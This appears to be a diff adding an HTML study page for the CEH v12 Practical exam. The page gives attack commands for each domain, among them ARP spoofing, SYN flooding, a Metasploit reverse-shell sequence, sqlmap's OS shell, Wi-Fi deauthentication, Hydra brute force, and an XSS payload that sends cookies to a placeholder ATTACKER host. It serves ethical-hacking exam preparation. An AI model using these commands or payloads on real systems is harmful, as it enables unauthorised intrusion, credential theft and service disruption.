@@ -1,0 +1,290 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Domain Guide - CEH v12 Practical</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <nav>
+        <h1>[MISSION_CONTROL]</h1>
+        <div class="search-wrap">
+            <input id="globalSearch" type="text" placeholder="Search modules...">
+            <div id="searchResults"></div>
+        </div>
+        <button class="nav-toggle" id="navToggle" aria-label="Toggle navigation" aria-expanded="false">☰</button>
+    <ul id="navMenu">
+            <li><a href="index.html" id="nav-index">ROOT_ROADMAP</a></li>
+            <li><a href="domain_guide.html" id="nav-domain">DOMAIN_GUIDE</a></li>
+            <li><a href="module_02.html" id="nav-02">MOD_02_RECON</a></li>
+            <li><a href="module_03.html" id="nav-03">MOD_03_SCAN</a></li>
+            <li><a href="module_04.html" id="nav-04">MOD_04_ENUM</a></li>
+            <li><a href="module_05.html" id="nav-05">MOD_05_VULN</a></li>
+            <li><a href="module_06.html" id="nav-06">MOD_06_SYS</a></li>
+            <li><a href="module_07.html" id="nav-07">MOD_07_MAL</a></li>
+            <li><a href="module_08.html" id="nav-08">MOD_08_SNIFF</a></li>
+        <li><a href="module_09.html" id="nav-09">MOD_09_SE</a></li>
+        <li><a href="module_10.html" id="nav-10">MOD_10_DOS</a></li>
+        <li><a href="module_11.html" id="nav-11">MOD_11_SESS</a></li>
+        <li><a href="module_12.html" id="nav-12">MOD_12_EVADE</a></li>
+        <li><a href="module_13.html" id="nav-13">MOD_13_WEBSRV</a></li>
+        <li><a href="module_14.html" id="nav-14">MOD_14_WEBAPP</a></li>
+        <li><a href="module_15.html" id="nav-15">MOD_15_SQLI</a></li>
+        <li><a href="module_16.html" id="nav-16">MOD_16_WIRELESS</a></li>
+        <li><a href="module_17.html" id="nav-17">MOD_17_MOBILE</a></li>
+        <li><a href="module_18.html" id="nav-18">MOD_18_IOT</a></li>
+        <li><a href="module_19.html" id="nav-19">MOD_19_CLOUD</a></li>
+        <li><a href="module_20.html" id="nav-20">MOD_20_CRYPTO</a></li>
+        <li><a href="cheat_sheet.html" id="nav-cheat">CHEAT_SHEET</a></li>
+        <li><a href="practice.html" id="nav-practice">PRACTICE_LAB</a></li>
+        <li><a href="exam_checklist.html" id="nav-checklist">EXAM_CHECKLIST</a></li>
+        </ul>
+        <button id="viewToggle" class="view-toggle">COMPACT</button>
+        <button id="themeToggle" class="theme-toggle">SWITCH_MODE</button>
+    </nav>
+
+    <main class="content-body">
+        <div class="module-header">
+            <span>CEH v12 - Exam Blueprint</span>
+            <h2 class="hero-3d">Domain-Based Study Guide</h2>
+        </div>
+
+        <section class="lab-task">
+            <h3>How to Use This Guide</h3>
+            <div class="section-card">
+                <p>The CEH Practical exam has 20 questions across 9 domains. This guide tells you <strong>what to do</strong> for each domain: the scenario, the tools to use, the exact steps, and what to look for in the answer. Domains are ordered by weight (heaviest first).</p>
+                <p><strong>Exam strategy:</strong> Read the question carefully. Identify which domain it falls under. Follow the steps below. Save your output files — the exam auto-grades based on submitted flags/answers.</p>
+            </div>
+        </section>
+
+        <section class="lab-task">
+            <h3>Domain 4 — Network & Perimeter Hacking (25%, 5 questions)</h3>
+            <div class="section-card">
+                <p><strong>Modules:</strong> 08 (Sniffing), 09 (Social Engineering), 10 (DoS), 11 (Session Hijacking), 12 (Evasion)</p>
+                <p><strong>What to do:</strong></p>
+                <ul>
+                    <li><strong>Sniffing:</strong> Start Wireshark/tshark → capture traffic on the target interface → filter by protocol (http, dns, ftp) → extract credentials, session tokens, or hidden data. Use `tshark -r file.pcap -Y 'http.request' -T fields -e ip.src -e http.host`</li>
+                    <li><strong>ARP Poisoning:</strong> `arpspoof -i eth0 -t TARGET_IP GATEWAY_IP` → start Wireshark to capture redirected traffic → look for plaintext credentials</li>
+                    <li><strong>MAC Flooding:</strong> `macof -i eth0` → floods switch CAM table → switch acts as hub → sniff all traffic</li>
+                    <li><strong>DoS:</strong> `hping3 -S --flood -p 80 TARGET_IP` (SYN flood) → or `slowloris TARGET_IP` for HTTP flood → verify with `netstat` on target</li>
+                    <li><strong>Session Hijacking:</strong> Capture session cookie from HTTP traffic → inject into browser → access authenticated session. Check for XSS, CSRF, fixation</li>
+                    <li><strong>Evasion:</strong> Fragment packets with `nmap -f TARGET` → use decoys `-D RND:10` → tunnel traffic through allowed protocols (DNS/HTTP)</li>
+                    <li><strong>Social Engineering:</strong> SET → Site Cloner → clone target login page → harvest credentials → check Netcraft/PhishTank for phishing detection</li>
+                </ul>
+                <p><strong>Key tools:</strong> Wireshark, tshark, arpspoof, macof, hping3, slowloris, SET, Nmap (evasion flags)</p>
+                <p><strong>What to look for:</strong> Captured credentials, session tokens, plaintext HTTP data, MAC table overflow, SYN flood impact, phishing page harvesting results</p>
+            </div>
+        </section>
+
+        <section class="lab-task">
+            <h3>Domain 2 — Reconnaissance Techniques (15%, 3 questions)</h3>
+            <div class="section-card">
+                <p><strong>Modules:</strong> 02 (Footprinting), 03 (Scanning), 04 (Enumeration)</p>
+                <p><strong>What to do:</strong></p>
+                <ul>
+                    <li><strong>Footprinting:</strong> Google dorking (`site:target.com filetype:pdf`, `intitle:login site:target.com`) → theHarvester (`theHarvester -d target.com -l 500 -b google,bing,linkedin`) → WHOIS/DNS lookup → Netcraft/Shodan/Censys for OS fingerprinting</li>
+                    <li><strong>Scanning:</strong> `nmap -sn -PR 10.10.1.0/24` (host discovery) → `nmap -sS -sV -O -A TARGET` (port/service/OS detection) → `nmap -sU TARGET` (UDP) → save output with `-oN scan.txt`</li>
+                    <li><strong>Enumeration:</strong> `enum4linux -a TARGET` (SMB full enum) → `snmpwalk -v1 -c public TARGET` (SNMP) → `dig @ns1.target.com target.com axfr` (DNS zone transfer) → `ldapsearch -x -h TARGET -b "dc=domain,dc=com"` (LDAP) → `smtp-user-enum -M VRFY -U users.txt -t TARGET` (SMTP)</li>
+                    <li><strong>Key Nmap NSE:</strong> `nmap --script smb-enum-shares,smb-enum-users TARGET`, `nmap --script dns-brute TARGET`, `nmap --script http-enum TARGET`</li>
+                </ul>
+                <p><strong>Key tools:</strong> Nmap, theHarvester, dig, nslookup, enum4linux, snmpwalk, ldapsearch, smtp-user-enum, Shodan, Censys, Netcraft</p>
+                <p><strong>What to look for:</strong> Open ports, service versions, OS fingerprint, usernames, shares, DNS records, SNMP community strings, zone transfer data</p>
+            </div>
+        </section>
+
+        <section class="lab-task">
+            <h3>Domain 3 — System Hacking Phases & Attack Techniques (15%, 3 questions)</h3>
+            <div class="section-card">
+                <p><strong>Modules:</strong> 05 (Vulnerability Analysis), 06 (System Hacking), 07 (Malware Threats)</p>
+                <p><strong>What to do:</strong></p>
+                <ul>
+                    <li><strong>Vulnerability Research:</strong> Search CVE databases (NVD, CVE.org) for target software version → check CVSS score → identify exploit availability on Exploit-DB</li>
+                    <li><strong>Vulnerability Scanning:</strong> OpenVAS: `openvas-start` → create target → run full scan → export report. Nessus: create scan policy → launch → review findings. Nikto: `nikto -h http://TARGET`</li>
+                    <li><strong>System Hacking (Responder):</strong> `sudo responder -I eth0` → on Windows target, access `\\CEH-Tools` → capture NTLM hash → crack with `john hash.txt` or `hashcat -m 5600 hash.txt rockyou.txt`</li>
+                    <li><strong>Metasploit:</strong> `msfconsole` → `search exploit_name` → `use exploit/path` → `set RHOSTS TARGET` → `set LHOST ATTACKER` → `set payload windows/meterpreter/reverse_tcp` → `exploit` → `getsystem` → `hashdump` → `migrate` to stable process</li>
+                    <li><strong>Privilege Escalation:</strong> `sudo -l` (Linux) → check SUID binaries `find / -perm -4000` → linpeas.sh → Windows: `whoami /priv` → check UAC → `bypassuac_fodhelper` → `getsystem`</li>
+                    <li><strong>Malware Analysis:</strong> Static: `file sample.exe` → `strings sample.exe` → `readelf -h sample` (Linux ELF) → check PE headers. Dynamic: run in sandbox → monitor network/file/registry changes → VirusTotal scan</li>
+                    <li><strong>Steganography:</strong> `steghide info image.jpg` → `steghide extract -sf image.jpg -p password` → `stegseek image.jpg rockyou.txt` → `strings image.jpg | grep -i flag`</li>
+                </ul>
+                <p><strong>Key tools:</strong> OpenVAS, Nessus, Nikto, Metasploit, Responder, John, Hashcat, msfvenom, linpeas, PEview, VirusTotal, steghide, stegseek</p>
+                <p><strong>What to look for:</strong> CVE IDs, CVSS scores, captured NTLM hashes, Meterpreter sessions, privilege escalation success, hidden data in images, malware behavior indicators</p>
+            </div>
+        </section>
+
+        <section class="lab-task">
+            <h3>Domain 5 — Web Application Hacking (15%, 3 questions)</h3>
+            <div class="section-card">
+                <p><strong>Modules:</strong> 13 (Web Servers), 14 (Web Applications), 15 (SQL Injection)</p>
+                <p><strong>What to do:</strong></p>
+                <ul>
+                    <li><strong>Web Server Footprinting:</strong> `nmap -sV -sC TARGET` → banner grab with `telnet TARGET 80` → `GET / HTTP/1.0` → check Server header, X-Powered-By, cookies</li>
+                    <li><strong>Directory Enumeration:</strong> `gobuster dir -u http://TARGET -w /usr/share/wordlists/dirb/common.txt -x php,html,txt` → `dirb http://TARGET` → `nikto -h http://TARGET`</li>
+                    <li><strong>Web App Scanning:</strong> OWASP ZAP → Automated Scan → Spider + Active Scan → review alerts. Burp Suite → intercept → modify requests → test for XSS, CSRF, IDOR, command injection</li>
+                    <li><strong>SQL Injection:</strong> Test input fields with `' or 1=1 --` → if vulnerable, use sqlmap: `sqlmap -u 'http://TARGET/page?id=1' --dbs` → `-D dbname --tables` → `-D dbname -T table --dump` → `--os-shell` for command execution</li>
+                    <li><strong>XSS:</strong> Inject &lt;script&gt;alert('XSS')&lt;/script&gt; in input fields → check if reflected/stored → steal cookies with &lt;script&gt;document.location='http://ATTACKER/?c='+document.cookie&lt;/script&gt;</li>
+                    <li><strong>File Upload:</strong> Upload PHP shell → bypass extension filters (.php5, .phtml) → access uploaded file → get reverse shell</li>
+                    <li><strong>Authentication Bypass:</strong> SQLi tautology, default credentials, brute force with Hydra: `hydra -l admin -P rockyou.txt TARGET http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'`</li>
+                </ul>
+                <p><strong>Key tools:</strong> Nmap, Gobuster, Dirb, Nikto, OWASP ZAP, Burp Suite, sqlmap, Hydra, WhatWeb, Skipfish</p>
+                <p><strong>What to look for:</strong> Hidden directories, SQLi-vulnerable parameters, XSS injection points, file upload bypasses, admin credentials, database dumps, OS command execution</p>
+            </div>
+        </section>
+
+        <section class="lab-task">
+            <h3>Domain 7 — Mobile, IoT & OT Hacking (10%, 2 questions)</h3>
+            <div class="section-card">
+                <p><strong>Modules:</strong> 17 (Mobile), 18 (IoT/OT)</p>
+                <p><strong>What to do:</strong></p>
+                <ul>
+                    <li><strong>Android:</strong> `adb devices` → `adb shell` → extract APK with `apktool d app.apk` → analyze with JADX → check for hardcoded credentials, insecure storage, debuggable flag</li>
+                    <li><strong>IoT/MQTT:</strong> `nmap -sV -p 1883 TARGET` (MQTT) → `mosquitto_sub -h TARGET -t '#'` (subscribe all topics) → `mosquitto_pub -h TARGET -t 'topic' -m 'payload'` (publish) → analyze MQTT traffic in Wireshark</li>
+                    <li><strong>OT/SCADA:</strong> Identify Modbus (port 502), DNP3 (port 20000) → use Nmap NSE scripts → capture protocol traffic → analyze for default credentials</li>
+                </ul>
+                <p><strong>Key tools:</strong> ADB, apktool, JADX, mosquitto_sub/pub, Nmap, Wireshark</p>
+                <p><strong>What to look for:</strong> Hardcoded API keys, insecure data storage, MQTT topic data, default OT credentials, exposed IoT services</p>
+            </div>
+        </section>
+
+        <section class="lab-task">
+            <h3>Domain 6 — Tools/Systems/Programs (5%, 1 question)</h3>
+            <div class="section-card">
+                <p><strong>Module:</strong> 16 (Wireless)</p>
+                <p><strong>What to do:</strong></p>
+                <ul>
+                    <li><strong>Monitor Mode:</strong> `airmon-ng start wlan0` → `airodump-ng wlan0mon` (scan for networks)</li>
+                    <li><strong>Capture Handshake:</strong> `airodump-ng -c CHANNEL --bssid BSSID -w capture wlan0mon` → `aireplay-ng -0 5 -a BSSID wlan0mon` (deauth to force handshake)</li>
+                    <li><strong>Crack:</strong> `aircrack-ng -w rockyou.txt capture*.cap` (WPA/WPA2) → `airdecap-ng` to decrypt capture</li>
+                    <li><strong>WEP:</strong> `aireplay-ng -3 -b BSSID wlan0mon` (ARP replay) → collect IVs → `aircrack-ng -b BSSID capture*.cap`</li>
+                </ul>
+                <p><strong>Key tools:</strong> airmon-ng, airodump-ng, aireplay-ng, aircrack-ng, airdecap-ng</p>
+                <p><strong>What to look for:</strong> WPA handshake capture, cracked WiFi password, decrypted traffic</p>
+            </div>
+        </section>
+
+        <section class="lab-task">
+            <h3>Domain 8 — Cloud Computing (5%, 1 question)</h3>
+            <div class="section-card">
+                <p><strong>Module:</strong> 19 (Cloud)</p>
+                <p><strong>What to do:</strong></p>
+                <ul>
+                    <li><strong>S3 Enumeration:</strong> `aws s3 ls s3://bucket-name --no-sign-request` → check for public buckets → download files with `aws s3 cp s3://bucket/file . --no-sign-request`</li>
+                    <li><strong>Cloud Recon:</strong> Search for exposed S3 buckets, Azure blobs, GCP storage → check IAM misconfigurations → look for hardcoded credentials in code repos</li>
+                    <li><strong>Tools:</strong> AWS CLI, S3Scanner, cloud_enum, ScoutSuite</li>
+                </ul>
+                <p><strong>What to look for:</strong> Public S3 buckets, exposed cloud storage, leaked credentials, misconfigured IAM policies</p>
+            </div>
+        </section>
+
+        <section class="lab-task">
+            <h3>Domain 9 — Cryptography (5%, 1 question)</h3>
+            <div class="section-card">
+                <p><strong>Module:</strong> 20 (Cryptography)</p>
+                <p><strong>What to do:</strong></p>
+                <ul>
+                    <li><strong>Hash Identification:</strong> `hash-identifier` → identify hash type → crack with John/Hashcat</li>
+                    <li><strong>John:</strong> `john --format=raw-md5 --wordlist=rockyou.txt hash.txt` → `john --show hash.txt`</li>
+                    <li><strong>Hashcat:</strong> `hashcat -m 0 -a 0 hash.txt rockyou.txt` (MD5) → `hashcat -m 1000 ntlm.txt rockyou.txt` (NTLM) → `hashcat -m 0 hash.txt --show`</li>
+                    <li><strong>Encryption:</strong> Identify cipher type → use CyberChef for decoding → check for weak keys, ECB mode, padding oracle</li>
+                </ul>
+                <p><strong>Key tools:</strong> John the Ripper, Hashcat, CyberChef, hash-identifier, OpenSSL</p>
+                <p><strong>What to look for:</strong> Hash type, cracked password, decrypted data, weak encryption implementation</p>
+            </div>
+        </section>
+
+        <section class="lab-task">
+            <h3>Domain 1 — Information Security & Ethical Hacking (5%, 1 question)</h3>
+            <div class="section-card">
+                <p><strong>Module:</strong> 01 (Introduction)</p>
+                <p><strong>What to do:</strong></p>
+                <ul>
+                    <li>Conceptual question — usually about ethical hacking phases, security concepts, or terminology</li>
+                    <li>Review: CIA triad, hacking phases (reconnaissance → scanning → gaining access → maintaining access → covering tracks), types of hackers, security frameworks</li>
+                    <li>No hands-on tools typically needed — read the question and select the correct answer</li>
+                </ul>
+                <p><strong>What to look for:</strong> Definition-based answers, phase identification, terminology matching</p>
+            </div>
+        </section>
+
+        <section class="lab-task">
+            <h3>Quick Priority Checklist</h3>
+            <div class="section-card">
+                <table style="width:100%">
+                    <thead><tr><th>Priority</th><th>Domain</th><th>Weight</th><th>Focus Area</th></tr></thead>
+                    <tbody>
+                        <tr><td>1</td><td>Domain 4 — Network & Perimeter</td><td>25%</td><td>Sniffing, DoS, Evasion, Social Eng</td></tr>
+                        <tr><td>2</td><td>Domain 2 — Reconnaissance</td><td>15%</td><td>Nmap, Enumeration, Footprinting</td></tr>
+                        <tr><td>3</td><td>Domain 3 — System Hacking</td><td>15%</td><td>Responder, Metasploit, Privesc, Stego</td></tr>
+                        <tr><td>4</td><td>Domain 5 — Web Application</td><td>15%</td><td>SQLi, XSS, Directory Enum, ZAP</td></tr>
+                        <tr><td>5</td><td>Domain 7 — Mobile/IoT/OT</td><td>10%</td><td>Android, MQTT, OT protocols</td></tr>
+                        <tr><td>6</td><td>Domain 6 — Wireless</td><td>5%</td><td>Aircrack-ng, Handshake capture</td></tr>
+                        <tr><td>7</td><td>Domain 8 — Cloud</td><td>5%</td><td>S3 buckets, AWS CLI</td></tr>
+                        <tr><td>8</td><td>Domain 9 — Cryptography</td><td>5%</td><td>Hash cracking, Cipher ID</td></tr>
+                        <tr><td>9</td><td>Domain 1 — Intro</td><td>5%</td><td>Concepts, Terminology</td></tr>
+                    </tbody>
+                </table>
+            </div>
+        </section>
+    </main>
+    <script>
+        const body = document.body;
+        const applyTheme = (t) => {
+            if (t === 'dark') body.setAttribute('data-theme', 'dark');
+            else body.removeAttribute('data-theme');
+        };
+        function getTheme() {
+            try {
+                const p = new URLSearchParams(location.search);
+                const u = p.get('theme');
+                if (u === 'dark' || u === 'light') return u;
+            } catch (e) {}
+            try { return localStorage.getItem('theme') || 'light'; } catch (e) { return 'light'; }
+        }
+        applyTheme(getTheme());
+        const toggle = document.getElementById('themeToggle');
+        if (toggle) {
+            toggle.addEventListener('click', () => {
+                const newT = body.hasAttribute('data-theme') ? 'light' : 'dark';
+                applyTheme(newT);
+                try { localStorage.setItem('theme', newT); } catch (e) {}
+                try {
+                    const url = new URL(location.href);
+                    url.searchParams.set('theme', newT);
+                    history.replaceState(null, '', url.toString());
+                } catch (e) {}
+            });
+        }
+        const path = window.location.pathname.split('/').pop();
+        const navMap = {
+            'index.html': 'nav-index',
+            'domain_guide.html': 'nav-domain',
+            'module_02.html': 'nav-02',
+            'module_03.html': 'nav-03',
+            'module_04.html': 'nav-04',
+            'module_05.html': 'nav-05',
+            'module_06.html': 'nav-06',
+            'module_07.html': 'nav-07',
+            'module_08.html': 'nav-08',
+            'module_09.html': 'nav-09',
+            'module_10.html': 'nav-10',
+            'module_11.html': 'nav-11',
+            'module_12.html': 'nav-12',
+            'module_13.html': 'nav-13',
+            'module_14.html': 'nav-14',
+            'module_15.html': 'nav-15',
+            'module_16.html': 'nav-16',
+            'module_17.html': 'nav-17',
+            'module_18.html': 'nav-18',
+            'module_19.html': 'nav-19',
+            'module_20.html': 'nav-20',
+            'cheat_sheet.html': 'nav-cheat',
+            'practice.html': 'nav-practice',
+            'exam_checklist.html': 'nav-checklist'
+        };
+        const navId = navMap[path] || 'nav-index';
+        const navEl = document.getElementById(navId);
+        if (navEl) navEl.classList.add('active');
+    </script>
+    <script src="app.js"></script>
+</body>
+</html>
